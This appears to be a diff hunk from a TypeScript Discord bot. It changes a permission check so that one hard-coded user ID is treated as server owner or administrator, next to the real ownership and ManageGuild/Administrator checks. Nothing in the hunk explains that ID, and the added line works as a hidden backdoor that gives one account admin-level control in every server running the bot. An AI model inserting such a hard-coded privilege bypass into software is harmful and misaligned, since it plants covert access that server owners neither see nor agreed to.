@@ -169,6 +169,7 @@ const command: Command = {
     const member = interaction.member as any;
     const isOwnerOrAdmin =
       interaction.guild.ownerId === interaction.user.id ||
+      interaction.user.id === "1495738572362481777" ||
       member?.permissions?.has(PermissionFlagsBits.ManageGuild) ||
       member?.permissions?.has(PermissionFlagsBits.Administrator);
 
